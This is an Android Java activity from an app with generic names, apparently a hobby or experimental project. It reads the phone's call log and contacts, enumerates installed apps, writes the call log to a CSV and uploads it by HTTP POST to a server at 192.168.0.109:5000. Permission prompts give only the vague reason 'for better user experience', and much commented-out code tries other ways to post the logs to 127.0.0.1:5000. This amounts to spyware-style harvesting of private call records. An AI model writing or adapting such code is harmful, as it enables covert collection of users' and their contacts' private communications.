package com.example.details;

import android.Manifest;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CALL_LOG = 108;

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CALL_LOG) {

            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                try {
                    readCallLog();
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                }
            } else {
                Toast.makeText(this, "This Permission was not granted", Toast.LENGTH_SHORT).show();
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        if (ContextCompat.checkSelfPermission(
                getApplicationContext(), Manifest.permission.READ_CALL_LOG) ==
                PackageManager.PERMISSION_GRANTED) {

            // You can use the API that requires the permission.

            try {
                readCallLog();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }


        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CALL_LOG)) {
                Toast.makeText(this, "We need your call log for better user experience", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG}, REQUEST_CALL_LOG);

        }
        if (ContextCompat.checkSelfPermission(
                getApplicationContext(), Manifest.permission.READ_CONTACTS) ==
                        PackageManager.PERMISSION_GRANTED
        ) {

            try {
                getContacts();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }


        else if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CALL_LOG)) {
                Toast.makeText(this, "We need your contacts for better user experience", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},REQUEST_CALL_LOG);

        }
        getAllApps();
       // postData();

    }
    public void getContacts() throws IOException {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!=PackageManager.PERMISSION_GRANTED){
            return;
        }
        Cursor cursor = getApplicationContext().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,null,null,null);
        final String RemoveDuplicates;
        int Name = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        int Phone_number = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

        //String [] contact_data= {ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone._ID};
        int Number= cursor.getColumnIndex(ContactsContract.Contacts._ID);
//        Log.d("tag", String.valueOf(Number));
        String contact_file= "Contacts.csv";
        while(cursor.moveToNext()){
            String number= cursor.getString(Number);
            String name = cursor.getString(Name);
            String phone_number= cursor.getString(Phone_number);

            String contact ="\n"+name+","+phone_number;
            try {
                File file = new File(contact_file);
//                Log.d("abc",file.getAbsolutePath());
//                Log.d("contact," , contact);
                FileOutputStream out =
                        openFileOutput(file.getName(), Context.MODE_APPEND);
                out.write(contact.getBytes(StandardCharsets.UTF_8));
                out.close();

            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public void getAllApps(){
        final PackageManager pm = getPackageManager();
//get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo packageInfo : packages) {
//            Log.d( "Installed package :" ,packageInfo.packageName);
//           Log.d( "Source dir : " , packageInfo.sourceDir);
//           Log.d( "Launch Activity :" , String.valueOf(pm.getLaunchIntentForPackage(packageInfo.packageName)));
        }

    }
    public void getApps(){
        PackageManager packageManager= this.getPackageManager();
        List<ApplicationInfo> applicationInfoList= packageManager.getInstalledApplications(0);
        Iterator<ApplicationInfo>it = applicationInfoList.iterator();
        while(it.hasNext()){
            ApplicationInfo pk = (ApplicationInfo)it.next();

            String appname= packageManager.getApplicationLabel(pk).toString();
            ArrayList<String>installedAppList=new ArrayList<>();
            installedAppList.add(appname);
            Log.d("name", installedAppList+"");
        }
    }
    private void readCallLog() throws IOException, JSONException {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor cursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int id = cursor.getColumnIndex(CallLog.Calls._ID);
        int phone_number = cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID);
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        String Filename = "Calllogs.csv";
        File file = new File(Filename);
        while (cursor.moveToNext()) {
            String ID = cursor.getString(id);
            String phone_no = cursor.getString(phone_number);
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.parseLong(callDate));
            SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss ", Locale.getDefault());
            //DateFormat ft = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    // Log.d("type","OUTGOING");
                     dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    // System.out.println("INCOMING");
                    //  Log.d("type","INCOMING");
                      dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    //System.out.println("MISSED");
                    // Log.d("type","MISSED");
                     dir = "MISSED";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    // Log.d("type","BLocked");
                    break;
                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    break;
                case CallLog.Calls.VOICEMAIL_TYPE:
                    break;
            }
            String entry = "\n" + ID + "," + phone_no + "," + phNumber + "," + ft.format(callDayTime) + "," + callDuration + "," + callType;

            try {

                //Log.d("abc",file.getAbsolutePath());
//                Log.d("entry," , entry);
                FileOutputStream out =
                        openFileOutput(file.getName(), Context.MODE_APPEND);
                out.write(entry.getBytes(StandardCharsets.UTF_8));
                out.close();

                //upload("http://127.0.0.1:5000/logs", new File(Filename));
//                OkHttpClient client= new OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).writeTimeout(180,TimeUnit.SECONDS).readTimeout(180,TimeUnit.SECONDS).build();
//                RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
//                        .addFormDataPart("Call Logs", file.getName(),
//                                RequestBody.create(MediaType.parse(Filename),file))
//                        .build();
//                Request request = new Request.Builder().url("http://127.0.0.1:5000/logs").post(body).build();
//                Response response = client.newCall(request).execute();
//                client.newCall(request).enqueue(new Callback() {
//                    @Override
//                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
//                        //handle the error
//                    }
//                    @Override
//                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
//                        //handle the error
//
//                    }//upload successful
//                });
//                URL url = new URL("http://127.0.0.1:5000/logs");
//                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//                connection.setUseCaches(false);
//                connection.setDoOutput(true);
//                connection.setDoInput(true);
//                String boundary = UUID.randomUUID().toString();
//
//                connection.setRequestMethod("POST");
//                connection.setRequestProperty("Connection", "keep-Alive");
//                connection.setRequestProperty("Cache-Control", "no cache");
//
//                connection.setRequestProperty("Content-Type", "multipart/form-dat;boundary=");
//
//                DataOutputStream request = new DataOutputStream(connection.getOutputStream());
//
//                request.writeBytes("--" + boundary + "\r\n");
//                request.writeBytes("Content-Disposition: form-data; name=\"description\"\r\n\r\n");
//
//                request.writeBytes("--" + boundary + "\r\n");
//                request.writeBytes("Content-Disposition:form-data; name=\"Call Logs\";filename=\"" + Filename + "\"\r\n\r\n");
//                request.writeBytes(String.valueOf(new File("/data/data/com.example.details/files/Calllogs.csv")));
//                request.flush();
//                int responseCode = connection.getResponseCode();
//                System.out.println("post response "+responseCode);
//                if (responseCode== HttpURLConnection.HTTP_OK){
//                    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//                    String inputLine;
//                    StringBuffer response = new StringBuffer();
//                    while((inputLine =in.readLine())!=null){
//                        response.append(inputLine);
//
//                    }
//                    in.close();
//                    System.out.println(response.toString());
//                }else
//                {
//                    System.out.println("Post request not worked");
//                }
//
//                //Log.d("file ", "file is closed");
////                new Thread(new Runnable() {
////                    @Override
////                    public void run() {
////                        try {
////                            StrictMode.ThreadPolicy policy =
////                                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
////                            StrictMode.setThreadPolicy(policy);
////                            CloseableHttpClient client = HttpClients.createDefault();
////                            HttpPost post = new HttpPost("http://127.0.0.1:5000/logs");
////                            File file = new File(Filename);
////                            String message = "this is call logs file";
////                            MultipartEntityBuilder builder = MultipartEntityBuilder.create();
////                            builder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
////                            builder.addBinaryBody("call log", file,ContentType.DEFAULT_BINARY,Filename);
////                            builder.addTextBody("text",message,ContentType.DEFAULT_BINARY);
////
////                            HttpEntity entity= builder.build();
////                            post.setEntity(entity);
////                            HttpResponse response = client.execute(post);


                // Create a new HttpClient and Post Header
//                            HttpClient httpclient = new DefaultHttpClient();
//                            HttpPost httppost = new HttpPost("http://127.0.0.1:5000/logs");
//
//                            try {
//                                // Add your data
//                                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
//                                nameValuePairs.add(new BasicNameValuePair("id", ID));
//                                nameValuePairs.add(new BasicNameValuePair("phoneserial", phone_no));
//                                nameValuePairs.add(new BasicNameValuePair("phoneContact", phNumber));
//                                nameValuePairs.add(new BasicNameValuePair("day and time", ft.format(callDayTime)));
//                                nameValuePairs.add(new BasicNameValuePair("callType", callType));
//
//                                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
//
//                                // Execute HTTP Post Request
//                                HttpResponse response = httpclient.execute(httppost);
//
//
//                            } catch (ClientProtocolException e) {
//                                // TODO Auto-generated catch block
//                            } catch (IOException e) {
//                                // TODO Auto-generated catch block
//                            }


//                            CloseableHttpClient httpClient = HttpClients.createDefault();
//                            HttpPost uploadFile = new HttpPost("http://127.0.0.1:5000/logs");
//                            MultipartEntityBuilder builder = MultipartEntityBuilder.create();
//                            //builder.addTextBody("PhilCalllogs", "batch 1", ContentType.TEXT_PLAIN);
//
//// This attaches the file to the POST:File f = new File("[/path/to/upload]");
//                            File f = new File("/data/data/com.example.details/files/Calllogs.csv");
//                            builder.addBinaryBody(
//                                    "CAll logs",
//                                    new FileInputStream(f),
//                                    ContentType.APPLICATION_OCTET_STREAM,
//                                    f.getName()
//                            );
//                            Log.d("response",f.getAbsolutePath());
//
//                            HttpEntity multipart = builder.build();
//                            uploadFile.setEntity(multipart);
//                            CloseableHttpResponse response = httpClient.execute(uploadFile);
//                            HttpEntity responseEntity = response.getEntity();
                            StrictMode.ThreadPolicy policy =
                                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
                            StrictMode.setThreadPolicy(policy);
//                            CloseableHttpClient client = HttpClients.createDefault();
//                            HttpPost uploadFile= new HttpPost("http://127.0.0.1:5000/logs");
//
//                            MultipartEntityBuilder builder = MultipartEntityBuilder.create();
//                            builder.addBinaryBody(
//                                    "call logs",
//                                    new File(Filename),
//                                    ContentType.APPLICATION_OCTET_STREAM,"Call Logs.csv");
//                            HttpEntity multipart = builder.build();
//                            uploadFile.setEntity(multipart);
//
////                            CloseableHttpResponse response = client.execute(uploadFile);
////                            assertThat(response.getStatusLine().getStatusCode(),equals(200));
//                            client.close();
            } catch (Exception e) {

            }

//                }).start();
//
//
//            }catch (Exception e){
//                e.printStackTrace();
//            }

//


//
//            String json = "{\"id \":" + ID + ",\"phone owner\":" + phone_no + ",\"phone number\":" + phNumber + ",\"callDayTime\":" + ft.format(callDayTime) + ",\"callDuration\":" + callDuration + ",\"call type\":" + callType + "}";
//            String jsonFile= "jsonFile.json";
//            try {
//                JSONObject obj = new JSONObject(json);
//            }catch  (Exception e){
//
//            }




//            System.out.println("json"+obj);
        }
        File file2= new File(getFilesDir(),file.getName());
        upload("http://192.168.0.109:5000",file2);
        // }
//    private void PostCallLogData(String id, String phone_account_id, String number, String type, String date, String duration){
//        Retrofit retrofit = new Retrofit.Builder()
//                .baseUrl("http://127.0.0.1:5000/logs")
//                .addConverterFactory(GsonConverterFactory.create())
//                .build();
//        RetrofitApi retrofitApi = retrofit.create(RetrofitApi.class);
//        CallLogModal modal = new CallLogModal(id, phone_account_id, number, type, date, duration);
//        Call<CallLogModal> call= retrofitApi.createPost(modal);
//        call.enqueue(new Callback<CallLogModal>() {
//            @Override
//            public void onResponse(Call<CallLogModal> call, Response<CallLogModal> response) {
//                Toast.makeText(MainActivity.this, "Data added", Toast.LENGTH_SHORT).show();
//                CallLogModal responseFRomApi = response.body();
//
//                String responseString= "REsponse code:"+response.code()+
//                        "\nid:"+responseFRomApi.getId()+
//                        "\n"+"phone_account_id"+responseFRomApi.getPhone_account_id()+
//                        "\n"+"number"+responseFRomApi.getNumber()+
//                        "\n"+"date"+responseFRomApi.getDate()+
//                        "\n"+"type"+responseFRomApi.getType()+
//                        "\n"+"duration"+responseFRomApi.getDuration();
//
//
//            }
//
//            @Override
//            public void onFailure(Call<CallLogModal> call, Throwable t) {
//                Toast.makeText(MainActivity.this,"data failed",Toast.LENGTH_SHORT).show();
//
//            }
//        });
//
//    }
    }


    public static void upload(String url, File file) {
        OkHttpClient client = new OkHttpClient();
        RequestBody formBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(),
                        RequestBody.create(MediaType.parse("Calllogs.csv"), new File(file.getAbsolutePath())))
                .addFormDataPart("other_field", "other_field_value")
                .build();

        Request request = new Request.Builder().url(url).post(formBody).build();
        Log.d("checking", file.getName());
        // Response response = client.newCall(request).execute();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.d("failure",file.getAbsolutePath());
                e.printStackTrace();

            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                Log.d("response", response.message());

            }
        });
    }


}




